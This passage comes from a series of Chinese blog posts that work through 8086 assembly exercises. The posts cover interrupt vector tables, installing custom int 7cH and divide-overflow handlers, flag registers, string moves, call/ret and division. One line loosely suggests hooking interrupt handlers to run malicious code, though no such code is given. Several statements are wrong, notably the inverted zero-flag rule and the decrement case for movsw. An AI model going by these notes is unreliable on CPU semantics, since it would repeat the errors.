;列的标准偏移量是2个字节 mul dl ;同一行列的偏移量，尽量使用乘法，（al）=列偏移 add bx, ax ;最终获得偏移地址(bx)=506H mov di,0 ;将di作为每个字符的偏移量 mov al, cl ;将字符属性写入al中 mov ch, 0 ;将cx高8位设置为0 show: mov cl, ds:[si] ;将字符串单个字符读入cl中 jcxz ok ;判断字符串是否为零。 mov es:[bx+di+0], cl ;在显示缓冲区中写入字符 mov es:[bx+di+1], al ;在显示缓冲区中写入字符属性 add di, 2 inc si jmp short show ok: pop si ;字符串字符为0，结尾 pop dx pop cx ;恢复寄存器 iret show_strend:nop ;代码段结尾，便于计算7cH例程的长度。 code endsend start 实验13(2) 编写并安装int 7ch中断例程，功能为完成loop指令的功能。 参数:（cx）=循环次数，（bx）=位移。 以上中断例程安装好后，对下面的程序进行单步跟踪，尤其注意int，iret指令执行前后cs，ip的和栈中的状态。 实验目的： 测试调用代码如下： 123456789101112131415161718192021222324252627282930313233assume cs:codecode segmentstart: mov ax, 0b800H mov es, ax mov di, 160*12 mov bx, offset s – offset se mov cx, 80 s: mov byte ptr es:[di], &#x27;!&#x27; add di, 2 int 7cH se: nop mov ax, 4c00H int 21Hcode endsend start 程序分析： （1）编写一个7cH的中断例程，实现loop语句的功能。通过以上实例，我们发现int 7cH实现的功能就是loop指令的功能。如果（cx）不等于0，跳转到s标号继续执行。并且调用一次int 7cH，（cx）=（cx）-1（每次）. （2）7cH的入口参数：cx、bx（我们规定的），cx代表计数器，bx代表了相对位移。因为中断例程不是返回到操作系统，故它必然包含iret指令，返回到调用那一点。 （3）回忆loop指令，它的相对位移是：从标号s（按照本例子来说）- loop指令下面那个指令的首地址（也就是se标号的地址）。由于int 7cH就等价于loop指令，那么它入口参数也需要相对的位移，这个相对位移就是（bx）=offset s – offset se。这里se标号与前面2个例程用途不一样了，它不用作计算例程的长度了，它代表了se标号的地址，用于计算相对位移了。 （4）我们来看看例程中，怎样实现将（cx）=（cx）-1（每次）；跳转到s标号处，直到（cx）=0。跳转到s标号，肯定是修改了ip了。至于cs也应该修改，虽然它在一个段内。产生的结果是：（ip）=s标号的ip，（cs）=s标号的cs。 （5）在调用7cH例程时，cs和ip都压栈了，cs值是s标号的cs，ip的值应该是标号se的偏移地址。那么在栈中，有了s标号的cs了，偏移地址是se的偏移地址。怎样把计算出s的偏移地址，这个例程的任务就完成了。 （6）我们可以利用iret指令。回忆iret指令，（执行iret指令，用汇编描述的过程是：pop ip；pop cs；popf，与我们引发中断过程中CPU执行的入栈过程（pushf；push cs；push ip）正好是相对应的。）popf弹栈状态寄存器值，我们不讨论了。这里主要讨论ip和cs，cs肯定是s标号的cs了，我们现在想法把栈中的ip值（栈中的值为se标号的值）修改为offset se +（bx）那么它肯定就是s标号的地址值。最后在弹栈，实现（cs）=s标号的cs，（ip）=s标号的ip了。 （7）回忆栈结构，此例中是使用的系统自动的栈（这个我喜欢，但也不要蒙圈了。）ss代表栈的段地址。bp默认是偏移地址，也就是说ss：[bp]就代表了栈空间的bp单元。sp是栈顶的指针。在8086中，一个栈的基本单元是2个字节的。以上分析都有了清晰的认识后，我们来看看这个例程代码： （8）例程代码： 12345678910111213lp: push bp ;将bp这个ss栈的偏址保存 mov bp, sp ;将当前栈顶指针值送入到bp dec cx ;调用一次7cH，（cx）-1 jcxz lpret ;与（cx）值判断，如果为0，跳转到lpret标号 add [bp+2], bx ;修改ss栈中的从栈顶向下第2个单元的值 lpret: pop bp ;恢复bp值 iret ;返回到调用处。 程序分析： 【1】因为ss和bp是配套使用的，[bp]代表ss栈中单元，bp也就是ss的偏移地址。push bp目的是保护bp的值，因为下面将会用到bp变量。 【2】mov bp, sp将栈顶指针sp送入到bp；此时栈中的数据有（从栈顶开始依次向下），bp的值（刚压入的），ip值（int 7cH调用时的，应该是se标号的值），cs值（int 7cH调用时的，应该和s标号的值一样的），flag值（int 7cH调用时的，标志寄存器的值，这个我们不考虑）。【3】dec cx; 我们为了实现loop的功能，在例程中应该是执行一次循环（调用一次7cH，）：cx的值就减1。 【4】jcxz lpret ;与（cx）值判断，如果为0，跳转到lpret标号， 【5】add [bp+2], bx 由于栈结构栈顶是低地址，我们想修改从栈顶向下第2个单元，也就是bp+2（此时bp=sp）；那么[bp+2]就代表了栈中从栈顶开始的第2个单元。正好，这个单元就是iret弹栈的ip的值。此时[bp+2]值是offset se，再加上一个相对偏移量bx，此时的[bp+2]=offset se+(bx)；也就是offset s的值。 【6】pop bp ;恢复bp值 【7】iret ；pop ip ，pop cs ，popf 装载程序代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273assume cs:codecode segmentstart: ;7cH中断例程的安装程序 mov ax, cs mov ds, ax mov si, offset lp ;将ds:si指向源地址（captial的机器码） mov ax, 0000H mov es, ax mov di, 200H ;将es:di指向目的地址（0:200H向量表中） mov cx, offset lpend - offset lp ;设置传输长度 cld ;传输方向为正 rep movsb ;字节传输 ;设置中断向量表，使7cH条目中断向量指向0000:200H mov ax, 0000H mov es, ax mov word ptr es:[7cH*4], 200H mov word ptr es:[7cH*4+2], 0000H mov ax, 4c00H int 21H;-------;装载的例程：7cH;功能：int 7cH实现和loop指令相同的功能;入口参数：cx计数器、bx相对地址偏移量;返回值：无;------- lp: push bp ;将bp这个ss栈的偏址保存 mov bp, sp ;将当前栈顶指针值送入到bp dec cx ;调用一次7cH，（cx）-1 jcxz lpret ;与（cx）值判断，如果为0，跳转到lpret标号 add [bp+2], bx ;修改ss栈中的从栈顶向下第2个单元的值lpret: pop bp ;恢复bp值 iret ;返回到调用处。 lpend: nop ;代码段结尾，便于计算7cH例程的长度。 code endsend start 实验13(3) 分别在屏幕的第2、4、6、8行显示4句英文诗，补全程序。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465assume cs:codecode segment s1: db &#x27;Good,better,best,&#x27;,&#x27;$&#x27; s2: db &#x27;Never let it rest,&#x27;,&#x27;$&#x27; s3: db &#x27;Till good is better,&#x27;,&#x27;$&#x27; s4: db &#x27;And better,best.&#x27;,&#x27;$&#x27; s: dw offset s1, offset s2, offset s3, offset s4 row: db 2, 4, 6, 8start : mov ax, cs mov ds, ax ;将ds也指向了cs段 mov bx, offset s ;(bx)=s标号地址 mov si, offset row ;（si）=row标号的地址。 mov cx, 4 ;计数器置为4,4行字符串ok: ;在DOS窗口设置光标的位置， mov bh,0 ;BIOS中的10h中断例程的入口参数设置，bh（页号）=0 mov dh, [si] ;入口参数：dh（行号）=（si） mov dl, 0 ;入口参数：dl（列数）=0 mov ah, 2 ;10h例程中的2号子程序，功能：设置光标位置。 int 10h ;调用中断例程 ;开始显示字符串。调用21h例程，9号子程序 mov dx,[bx] ;入口参数：dx=（bx），每个字符串的首地址。 ; 字符串地址存在 ds:offset s中，bx=offset s mov ah,9 ;dos系统中21h例程中的9号子程序 int 21h ;调用中断例程，功能：显示字符串（以$结尾的） inc si ;si按字节定义的。每次增量是1个字节。 add bx,2 ;bx是按照字定义的，每次增量是2个字节。 loop ok mov ax,4c00h int 21h code endsend start"},{"title":"汇编学习第十二章","date":"2019-10-24","updated":"2024-03-19","path":"2019/10/24/汇编学习第十二章/","text":"中断向量表 8086系统在存储器的最低1KB区域（00000H~003FFH）建立一个中断向量表，存放256个中断类型的中断向量。这1024个单元被分成256组，每组包括4个字节单元，存储一个中断向量的段基址和段内偏移地址，高2个字节用於存放段基址，低两个字节用於存放段内偏移地址。 8086系统把中断向量表中的中断明确分为3个部份： 1.专用中断：类型号0~4（所以中断不是从1开始，而是0） 2.系统备用中断：类型号5~31H 3.用户中断：类型号32H~0FFH ##检测点12.1分析： 0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00 问3号对应的 处理程序入口 计算中断服务入口地址的方法是： 从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理过程的入口地址设置IP和CS 0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00 段基址：偏移地址 0 1 2 3 4 5 6 7 8 - 9 10 11 12 13 14 15（16个bytes，“-”为分隔符，每8个bytes分隔一次） 0号：00A7：1068 1号：0070：108B 2号：039D：0016 3号：0070：108B 3号：IP读取34=12的两个bytes就是12和13两个bytes，CS读取34+2=14的两个bytes就是14和15两个bytes。 中断过程 内中断，cpu什么时候会发出中断信号呢？一般有一下四种情况： ·除法指令 ·单步执行 ·int 0指令 ·int n指令 产生中断信号的情况又被称为中断源。cpu接收到中断信号以后，要根据中断信号来确定中断情况。所以，中断信息里面应该包括中断的来源以及中断的情况。因此，CPU将定义一个变量来存储辨别中断信息，称为中断字节码（8位变量）可以用中断字节码表示256种情况。 每种中断情况都对应一种中断处理程序，但是CPU又如何确定相应中断处理程序在内存中的地址呢？如何确定相应中断处理程序的入口地址？so，中断向量应运而生。中断向量就是中断处理程序的入口地址。不同的中断情况对应不同的中断处理程序，又对应不同的中断向量，为了高效的处理中断，我们又定义了中断向量表，顾名思义，中断向量表用来存储中断向量，就是中断处理程序的入口地址。一条中断向量有占用多少内存地址呢？中断向量用来存储中断处理程序的入口地址，包括段地址和偏移地址，所以占用两个字的存储单元，高地址字段用来存储段地址，低地址字段用来存储偏移地址。 CPU知道了相应中断处理程序的入口地址后，计算机处理中断，中断过程。用中断字节码找到中断向量，来设置CS和IP，这个过程由计算机硬件来完成，这个过程叫做中断过程。 以8086CPU为例,在接收到中断信息后，要执行的操作： 1.（从中断信息中）找到中断字节码 2.标志寄存器的值入堆栈 3.设置标志寄存器的第8位TF和第9位IF值为0 4.CS 值入栈 5.IP值入栈 6.从内存地址为 终端类型码4 和 中断类型码4+2的两个字单元读取中断处理程序的入口地址，设置CS IP 中断处理程序 由于cpu随时都有可能检测到中断信息，也就是说cpu随时都要执行中断处理程序，所以，中断处理程序必须一致存储在内存某段空间中。 中断处理程序的步骤： 1.保存用到的寄存器 2.处理中断 3.恢复用到的寄存器 4.用iret指令返回 cpu执行完中断处理程序以后，必须返回到原来的地址继续执行后面的内容，所以，在执行中断处理程序之前必须记录下原来执行指令的地址，便于中断处理完以后返回。 实验12 编写0号中断处理程序，在发生除法溢出时，在屏幕中间显示字符串 xxxx 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset do0 ; 设置ds指向被复制代码 mov ax,0 mov es,ax mov di,0200h ; 设置es指向要复制到的区域 CS:IP 0000:0200 mov cx,offset do0done-offset do0 ; 设置被复制的代码长度 ; 右边的计算是由编译器来完成的 cld ; 正向复制 rep movsb ; 复制 mov ax,0 mov es,ax ; 指向 0:0 mov word ptr es:[0*4],0200h mov word ptr es:[0*4+2],0 ; 修改中断向量表 ; 写入地址, N号中断对应的内存地址为4N+2 ; 偏移为4N mov ax,1000h mov bh,1 div bh ; 产生溢出错误 mov ax,4c00h int 21hdo0: jmp short do0start ; 跳转到程序运行的地方,否则CS:IP指向字符串将不能运行 db &quot;0V3rFlow!!&quot;do0start: mov ax,cs mov ds,ax mov si,0202h ; 设置ds:si 指向字符串 mov ax,0b800h ; 显存地址 mov es,ax mov di,12*160+36*2 ; 指向显存中间位置 mov cx,10 ; 设置字符串长度display: mov al,[si] mov es:[di],al ; 只设置低位字符 （一个字节,8bit) mov byte ptr es:[di+1],61h ; 设置高位属性 (一个字节,8bit) inc si add di,2 loop display cld ; 正向复制 rep movsb ; ds 复制到 es mov ax,4c00h int 21hdo0done: nopcode endsend start 联想: 溢出攻击,修改中断处理程序，使程序产生中断(例如溢出中断处理),来达到调用我们编写的恶意程序"},{"title":"汇编学习第十一章","date":"2019-10-24","updated":"2024-03-19","path":"2019/10/24/汇编学习第十一章/","text":"补码 及 溢出判断 标志寄存器 ZF标志 flag的第6位是ZF，零标志位（zero flag）。 它记录相关指令（add、sub、mul、div、inc、or、and操作）执行后，结果是否为0 。ZF = 1结果不为0，ZF = 0结果为0。 mov、push、pop等传送指令不修改标志寄存器的信息。 PF标志 flag的第2位是PF，奇偶标志位。 它记录指令执行后，结果的所有二进制位中1的个数是否为偶数，如果为偶数则PF = 1，为奇数，PF = 0。 SF标志 flag的第7位是SF，符号标志位。 它记录指令执行后，结果是否为负（就是看它二进制的第一位是不是1），如果为负数则SF = 1，结果为正， SF = 0。 例如： 我们可以将add指令进行的运算当作无符号数的运算，那么add指令相当于计算129+1，结果为130（10000010B）， 也可以将add指令进行的运算当作有符号数的运算，那么add指令相当于计算-(125+1)（补码=-(原码取反+1)），结果为-126（10000010B）。 CF标志 flag的第0位是CF，进位标志位。 一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值。 km 比如，两个8 位数据：98H+98H，将产生进位。 由于这个进位值在8位数中无法保存，其实CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。 8086CPU 就用flag的CF位来记录这个进位值。 比如，两个 8 位数据：97H-98H，将产生借位，借位后，相当于计算197H-98H。 而flag的CF位也可以用来记录这个借位值。 CF在减法时记录借位，加法时记录进位 判断加法是否有进位：两个八位数据相加是否大于255（2^8） 判断减法是否有借位：两个八位数据相加是否小于-255 OF标志 在进行有符号数运算的时候，如结果超过了机器所能表示的范围称为溢出。 mov al,98 add al,99 add指令运算的结果是(al)=0C5H ，因为进行的是有符如果我们用add 指令进行的是有符号数运算，则98+99=-59这样的结果让人无法接受。 造成这种情况的原因，就是实际的结果 197，作为一个有符号数，在 8 位寄存器al中存放不下。 由于在进行有符号数运算时，可能发生溢出而造成结果的错误。 则CPU需要对指令执行后是否产生溢出进行记录。 flag的第11位是OF，溢出标志位。 一般情况下，OF记录了有符号数运算的结果是否发生了溢出。如果发生溢出，OF=1，如果没有，OF=0。 一定要注意CF和OF的区别： CF是对无符号数运算有意义的标志位，对于无符号数运算，CPU用CF位来记录是否产生了进位； 而OF是对有符号数运算有意义的标志位，对于有符号数运算，CPU 用 OF 位来记录是否产生了溢出，当然，还要用SF位来记录结果的符号。 判断OF是否为1的方法：如果两个正8位数据相加，值为负数时或两个负8位数据相加，值为时数时OF的值为1 #标志寄存器 CF 与 OF OF是溢出位，OF=1或0，表示运算结果有无溢出。当算术运算的结果超出了带符号数的范围（8位带符号数的范围是-128——+127，16位的是-32728——+32767）。 CF是进位标志位CF=1或0，表示加减法操作中最高位有无进借位。 指令 adc指令 adc是带进位加法指令 ，它利用了CF位上记录的进位值。 格式：adc 操作对象1,操作对象2 功能：操作对象1=操作对象1+操作对象2+CF 比如：adc ax,bx 实现的功能是：(ax)=(ax)+(bx)+CF 我们来看一下两个数据：0198H和0183H如何相加的： 01 98 + 01 83 1 ----------------- 03 1B 可以看出，加法可以分两步来进行： （1）低位相加； （2）高位相加再加上低位相加产生的进位值。 下面的指令和add ax , bx具有相同的结果： add al,bl ; 低位相加产生进位 adc ah,bh ; 再用adc，高位相加时，加上进位 看来CPU提供 adc 指令的目的，就是来进行加法的第二步运算的。 adc指令和add指令相配合就可以对更大的数据进行加法运算。 sbb指令 sbb是带借位减法指令，它利用了CF位上记录的借位值。 格式：sbb 操作对象1,操作对象2 功能：操作对象1=操作对象1–操作对象2–CF 比如：sbb ax,bx 实现功能：(ax) = (ax) – (bx) – CF cmp指令 cmp 是比较指令，功能相当于减法指令，只是不保存结果。 cmp 指令执行后，将对标志寄存器产生影响。 可以通过其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。 格式：cmp 操作对象1,操作对象2 功能：计算操作对象1–操作对象2 但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。 其实，我们通过cmp 指令执行后，相关标志位的值就可以看出比较的结果。 例如：cmp ax,bx 以上可以得出： 上面有CF的值可以判断大小，那么通过OF和SF也可以知道（了解就行） （1）如果SF=1，而OF=0 OF=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负； 因SF=1，实际结果为负，所以逻辑上真正的结果为负，所以(ah)&lt;(bh)。 （2）如果SF=1，而OF=1 OF=1 ，说明有溢出，逻辑上真正结果的正负≠实际结果的正负；（即OF只要是1，那么逻辑结果就是反的） 因 SF=1 ，实际结果为负，实际结果为负，而又有溢出，这说明是由于溢出导致了实际结果为负， 简单分析一下，就可以看出，如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正。这样，SF=1，OF = 1 ，说明了(ah)&gt;(bh)。 （3）如果SF=0，而OF=1 OF=1 ，说明有溢出，逻辑上真正结果的正负≠实际结果的正负； 因SF=0，实际结果非负，而OF=1说明有溢出，则结果非 0 ，所以，实际结果为正。实际结果为正，而又有溢出，这说明是由于溢出导致了实际结果非负， 简单分析一下，就可以看出，如果因为溢出导致了实际结果为正，那么逻辑上真正的结果必然为负。这样，SF=0，OF = 1 ，说明了(ah)&lt;(bh)。 （4）如果SF=0，而OF=0 OF=0，说明没有溢出，逻辑上真正结果的正负=实际结果的正负； 因SF=0，实际结果非负，所以逻辑上真正的结果必然非负。所以(ah)≥(bh)。 检测比较结果的条件转移指令 转移时 转移指令 + 标号 DF标志和串传送指令 flag的第10位是DF，方向标志位。 在串处理指令中，控制每次操作后si，di的增减。 DF = 0：每次操作后si，di递增； DF = 1：每次操作后si，di递减。 格式1： movsb 功能：（以字节为单位传送） 相当于汇编指令：mov es:[di],byte ptr ds:[si];8086 (1) ((es)×16 + (di)) = ((ds) ×16 + (si)) (2) 如果DF = 0则： (si) = (si) + 1,(di) = (di) + 1 相当于 如果DF=0：inc si,inc di 如果DF = 1则： (si) = (si) - 1,(di) = (di) - 1 相当于 如果DF=1：dec si,dec di movsb 的功能是将 ds:si 指向的内存单元中的字节送入 es:di中，然后根据标志寄存器DF位的值，将 si和di递增或递减。 格式2：movsw 功能：（以字为单位传送） 相当于汇编指令：mov es:[di],word ptr ds:[si] (1) ((es)×16 + (di)) = ((ds) ×16 + (si)) (2) 如果DF = 0则： (si) = (si) + 2,(di) = (di) + 2 相当于 如果DF=0：add si,2 add di,2 如果DF = 1则： (si) = (si) - 2,(di) = (di) - 2 相当于 如果DF=1：add si,2 add di,2 movsw 的功能是将 ds:si 指向的内存单元中的字送入 es:di中，然后根据标志寄存器DF位的值，将 si和di递增或递减。 movsb 和 movsw与rep配合使用 rep movsb 用汇编语法来描述rep movsb的功能就是： s : movsb loop s rep movsw 用汇编语法来描述rep movsw的功能就是： s : movsw loop s rep的作用是根据cx的值，重复执行后面的串传送指令。 由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前个单元，则rep movsb就可以循环实现(cx)个字符的传送。 由于flag的DF位决定着串传送指令执行后，si和di改变的方向，所以我们可以通过DF的值来改变传送的方向 相关指令： cld指令：将标志寄存器的DF位置0 std指令：将标志寄存器的DF位置1 示例1：用串传送指令，将data段中的第一个字符串复制到它后面的空间中。 1234567891011121314151617data segment db ‘Welcome to masm！ db 16 dup (0)data ends1 mov ax,data2 mov ds,ax3 mov si,0 ;ds:si指向data:04 mov es,ax5 mov di,16 ;es:di指向data:166 mov cx ,16 ;(cx)=16，rep循环16次7 cld ;设置DF=0，正向传送8 rep movsb 示例二：用串传送指令，将F000H段中的最后16个字符复制到data段中。 data segment db 16 dup (0) data ends 123456789101 mov ax,0f000h2 mov ds,ax3 mov si,0ffffh ;ds:si指向f000:ffff4 mov ax,data5 mov es,ax6 mov di,15 ;es:di指向data:157 mov cx ,16 ;(cx)=16，rep循环16次8 std ;设置DF=1，逆向传送9 rep movsb pushf与popf pushf ：将标志寄存器的值压栈； popf ：从栈中弹出数据，送入标志寄存器中。 pushf和popf，为直接访问标志寄存器提供了一种方法。 实验11 小写字母转大写字母 123456789101112131415161718192021222324252627282930313233343536373839404142assume cs:codesgdatasg segment db &quot;BeijIng-&#x27;s All-Puodak S as asd.&quot;,0datasg endscodesg segment begin: mov ax,datasg mov ds,ax mov si,0 call letterc mov ax,4c00h int 21hletterc: push cx push si mov cx,0 ; 高位置零，低位无所谓 s: mov cl,[si] jcxz ok ; 如果cx为0，就结束程序 cmp cl,061h ; 判断是否大于 &#x27;a&#x27; jb continue ; 如果小于 &#x27;a&#x27; 则直接进行下一次循环 cmp cl,07ah ; 判断是否大于 &#x27;z&#x27; ja continue ; 如果大于&#x27;z&#x27; ，则直接进行下一次循环 and byte ptr [si],11011111b ; 找到 在(&#x27;a&#x27;,&#x27;z&#x27;)区间的字母，进行大小写转换 continue: inc si loop s ok: pop si ; 恢复寄存器信息 pop cx retcodesg endsend begin"},{"title":"汇编学习第十章","date":"2019-10-22","updated":"2024-03-19","path":"2019/10/22/汇编学习第十章/","text":"call 和 ret指令 call和ret指令 (都为绝对地址) call和ret指令都是转移指令，它们都修改IP，或同时修改CS和IP。 (call指令保存的IP是call指令的下一个ip) 它们经常被共同用来实现子程序的设计。 ret和retf ret指令用栈中的数据，修改IP的内容，从而实现近转移； retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。 CPU执行ret指令 0时，进行下面的两步操作： （1）(IP) = ((ss)*16 +(sp)) （2）(sp) = (sp)+2 CPU执行retf指令时，进行下面四步操作： （1）(IP) = ((ss)*16) + (sp) （2）(sp) = (sp) + 2 （3）(CS) = ((ss)*16) + (sp) （4）(sp) = (sp) + 2 用汇编语法来解释ret和retf指令，则： CPU执行ret指令时，相当于进行： pop IP CPU执行retf指令时，相当于进行： pop IP pop CS 例题 1 12345678910111213141516assume cs:code,ss:stackstack segment dw 8 dup(0)stack endscode segment start: mov ax, stack mov ss, ax mov sp, 0010H mov ds, ax call word ptr ds:[0EH] inc ax inc ax inc axcode endsend start 该题中的程序的数据段和栈段使用了同一段内存 , 也就是说 ds 和 ss 是相同的 执行到 call word ptr ds:[0EH] 的时候 , 具体的流程如下 : 1. CPU取指令 : (call word ptr ds:[0EH]) 2. ip自增上述指令的长度 , 指向了下一条指令 (inc ax) 3. 开始执行该指令 3.1. push ip ; 将 ip 压入栈 , 也就是 : ss:[0EH] 保存 ip 的低 8 位 , ss:[0FH] 保存高 8 位 3.2. jmp ds:[0EH] ( (ip) = ds:[0EH] , 也就是说 , 程序又从 ds:[0EH] 中取出数据赋值给 ip , 然后继续执行 ) 4. 现在其实就开始执行 ip 之前保存的地址的指令了 , 也就是三个 inc ax 5. 因此最终 ax 值为 3 2 1234567891011121314151617181920assume cs:code,ds:datadata segment dw 8 dup(0)data endscode segment start: mov ax, data mov ss, ax mov sp, 16 mov word ptr ss:[0], offset second mov ss:[2], cs call dword ptr ss:[0] nop second: mov ax, offset second sub ax, ss:[0CH] mov bx, cs sub bx, ss:[0EH]code endsend start 这个程序定义了数据段 , 其实也是栈段和数据段使用了同一段内存 首先也是初始化栈 : mov ax, data mov ss, ax mov sp, 16 然后执行 : mov word ptr ss:[0], offset s 将 s 标号处两个字节的地址移动到 ss:[0] 处 mov ss:[2], cs 将代码段地址的值保存在到 ss:[2] 处 , 同样两个字节 call dword ptr ss:[0] CPU首先读取该指令 然后将 ip 增加该指令的长度 然后准备开始执行 (由于是 dword 因此 cs 和 ip 都要压栈) 执行首先要将当前的 cs 压栈 (保存在 ss:[0EH]) 然后 ip (也就是 call 指令下一个指令的地址 , 也就是 nop 的地址) 压栈 (保存在 ss:[0CH]) 处 然后读取 ss:[0] 中的四个字节的数据 , 相当于 : 高地址为段地址 , 低地址为偏移地址 也就说 cs 为 (ss:[2]) , ip 为 (ss:[0]) 这个 cs 和 ip 组成的地址就是 second 的地址 现在开始执行 second mov ax, offset second 读指令 , ip自增 , 然后执行 , 因此执行完后 , ax 为该指令的偏移地址 然后 sub ax, ss:[0CH] 通过之前的分析 : ss:[0CH] 处保存的是 : call dword ptr ss:[0] 这条指令的下一条指令 nop 的相对于代码段偏移地址 ax = (mov ax, offset second 的偏移地址) - ( nop 的偏移地址) 也就是 nop 指令的长度 , 也就是 1 接下来 : mov bx, cs 将代码段的基址赋值给 bx bx = (bx) - (ss:[0EH]) (ss:[0EH]) = (cs) 因此 bx = 0 实验 计算过程 (以书中的 (F4240H / 0AH) 为例)。 int(H/N)*65536 即： 000FH / 000AH = 0001H 余 0005H 所以：int(H/N) = 1H , rem(H/N) = 0005H int(H/N)*65536 = 10000H [rem(H/N)*65536 + L] / N 即： 0005H * 65536 = 50000H 50000H + 4240H = 54240H 所以：[rem(H/N)*65536 + L] / N = 54240H / 0AH = 86A0H 余 0000H 最终结果： 10000H + 86A0H = 186A0H 且余数为0 分析 第一步中：除法的商为最终结果的商的高16位 ( int(H/N)*65536 )。 第二步中：上一步除法的余数(作为高16位)和被除数的低16位(作为低16位)共同参与32位的除法运算，所得的商为最终结果的商的低16位，所得余数为最终结果的余数。 代码 123456789101112131415mov ax,4240H mov dx,000FH mov cx,0AHdivdw:push bx push ax ;将被除数的低16位入栈 mov ax,dx ;将被除数的高16位存入ax mov dx,0 div cx ;即0000 000FH / 000AH，完成后ax为0001H, dx为0005H mov bx,ax ;将上面除法结果的商存入bx pop ax ;将被除数的低16位出栈，存入ax div cx ;即54240H / 0AH，完成后ax860AH ，dx为0000H mov cx,dx ;将余数存入cx mov dx,bx ;将结果的商的高16为存入dx pop bx ret 注意 cpu在执行指令时先读取当前CS:ip0处的指令，然后IP1=IP0++,此时执行指令如果需要保存IP的话，保存的值已经是IP1了，而不是IP0 例如: 12345678910111213141516assume cs:code,ss:stackstack segment dw 8 dup(0)stack endscode segment start: mov ax, stack ;ip0 mov ss, ax ;ip1 mov sp, 0010H ;ip2 mov ds, ax ;ip3 call word ptr ds:[0EH] ;ip4 这一行保存入栈的ip是ip5 inc ax ;ip5 inc ax ;ip6 inc ax ;ip7code endsend start 执行到CS:IP4时，CPU首先将此处命令加载到指令缓冲区，然后IP寄存器++ --&gt; IP5 ,然后执行命令: 入栈IP寄存器的值(IP5)，然后再…"},{"title":"汇编学习第九章","date":"2019-10-22","updated":"2024-03-19","path":"2019/10/22/汇编学习第九章/","text":"实验9 根据材料编程 12345678910111213141516171819202122232425262728293031323334353637383940assume ds:codedata segment ;要显示的字符串内容 db &#x27;welcome to masm!&#x27;data endscode segment start: ;设置数据段地址 mov ax,data mov ds,ax mov ax,0B800H ;B800H显示缓冲区的起始地址 mov es,ax mov bx,0 ;字符串内容的偏移地址，每次增加1 ;缓冲区的偏移地址，每次增加2 ;深入分析: ;需显示在屏幕中间，由材料知每1行有80个字符占160个字节，而显示 ;的字符串字节+属性字节，共32个字节，所以，要达到水平居中的效果 ;开始值应该为（160 - 32）/ 2 =64 mov bp,64 mov cx,16;循环16次 a: mov al,ds:[bx] ;取得字符串的字节数据 mov ah,02H ;字符串黑底绿色 ;（垂直居中，由材料可得共25行，要显示3行字符串，一行有160个字符（（25-3）/2）* 160 = 6E0H） mov es:[bp+6E0H],ax ;显示在第11行上 mov ah,42H ;字符串绿底红色 mov es:[bp+780H],ax ;显示在第12行上（6E0H + A0 = 780H） mov ah,71H ;字符串白底蓝色 mov es:[bp+820H],ax ;显示在第13行上（780H + A0 = 820H） ;累加操作 inc bx add bp,2 loop a mov ax,4C00H int 21Hcode endsend start"},{"title":"汇编第八章","date":"2019-10-21","updated":"2024-03-19","path":"2019/10/21/汇编第八章/","text":"寄存器 reg: ax,bx,cx,dx,sp,dp,si,di (si,di 不能分为两个8位寄存器来使用) 段寄存器 sreg: ds,ss,cs,esw (1)在8086CPU中只有这四个寄存器可以在[…]中进行内存单元的寻址。 比如，下面的指令都是正确的： 123456mov ax,[bx]mov ax,[bx+si]mov ax,[bx+di]mov ax,[bp]mov ax,[bp+si]mov ax,[bp+di] 而下面都是错误的: 1234mov ax,[cx]mov ax,[ax]mov ax,[dx]mov ax,[ds] (2).在[…]中，这四个寄存器可以单独出现，或者只能以四种组合出现：bx和si、bx和di、bp和si、bp和di。 比如下面都是正确的 123456789101112mov ax,[bx]mov ax,[si]mov ax,[di]mov ax,[bp]mov ax,[bx+si]mov ax,[bx+di]mov ax,[bp+si]mov ax,[bp+di]mov ax,[bx+si+idata]mov ax,[bx+si+idata]mov ax,[bp+si+idata]mov ax,[bp+di+idata] 下面就是错误的 12mov ax,[bx+bp]mov ax,[si+di] (3)只要在[…]中使用寄存器bp，而指令汇总没有显示给出段地址，段地址就默认在ss中。 比如下面的指令。 1234mov ax,[bp] 含义：(ax)=((ss)*16+(bp))mov ax,[bp+idata] 含义：(ax)=((ss)*16+(bp)+idata)mov ax,[bp+si] 含义：(ax)=((ss)*16+(bp)+(si))mov ax,[bp+si+idata] 含义：(ax)=((ss)*16+(bp)+(si)+idata) div指令 div是除法指令，使用div做除法的时候应注意以下问题： 1、除数：有8位和16位两种，在一个寄存器或者内存中。 2、被除数：默认放在AX或（DX和AX）中，如果除数为8位，被除数为16位，被除数默认在AX中存放，如果除数为16位，被除数为32位，被 除数则在（DX和AX）中存放，DX存放高16位，AX存放低16位。 3、结果：如果除数是8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数是16位，则AX存储除法操作的商，DX存储除法操作的余数。 格式如下： div reg div 内存单元 例子： 1234567891011121314151617div byte ptr ds:[0] (al)=(ax)/((ds)*16+0)的商 (ah)=(ax)/((ds)*16+0)的余数div word ptr es:[0](高十六位）+(低十六位) (ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商 (dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数div byte ptr [bx+si+8] (al)=(ax)/((ds)*16+(bx)+(si)+8)的商 (ah)=(ax)/((ds)*16+(bx)+(si)+8)的余数div word ptr [bx+si+8](高十六位)+(低十六位) (ax)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的商 (dx)=[(dx)*10000H+(ax)]/((ds)*16+(bx)+(si)+8)的余数 以100001/100为例，100001大于65535，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位的寄存器中存放，但是被除数是32位的，除数应为16位，所以要使用一个16位的寄存器来存放除数100. 